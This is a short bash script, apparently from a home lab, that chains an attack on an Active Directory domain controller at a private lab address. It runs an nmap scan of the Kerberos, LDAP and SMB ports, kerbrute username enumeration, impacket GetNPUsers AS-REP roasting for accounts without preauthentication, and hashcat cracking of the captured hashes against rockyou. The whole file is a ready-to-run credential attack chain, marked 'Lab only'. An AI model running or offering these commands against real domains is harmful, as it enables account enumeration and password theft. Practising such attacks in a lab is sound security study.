#!/usr/bin/env bash
# Reusable commands for the recon -> enumeration -> AS-REP Roasting chain.
# Lab only. Run from KALI (172.18.10.105) against the DC (172.18.10.100).
set -euo pipefail

DC_IP="172.18.10.100"
DOMAIN="youssefelazhar.be"
USERLIST="/usr/share/wordlists/usernames/usernames.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# 01 - Recon
ping -c 3 "$DC_IP"
nmap -p 53,88,135,139,389,445,464,636,3268,3269 -sV -sC "$DC_IP"

# 01 - Username enumeration
sudo kerbrute userenum -d "$DOMAIN" --dc "$DC_IP" "$USERLIST" -o users.txt

# 03 - AS-REP Roasting
sudo impacket-GetNPUsers "${DOMAIN}/" -dc-ip "$DC_IP" \
  -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt

# 03 - Offline cracking (mode 18200 = Kerberos 5 AS-REP etype 23)
sudo hashcat -m 18200 asrep.txt "$WORDLIST" -o cracked.txt
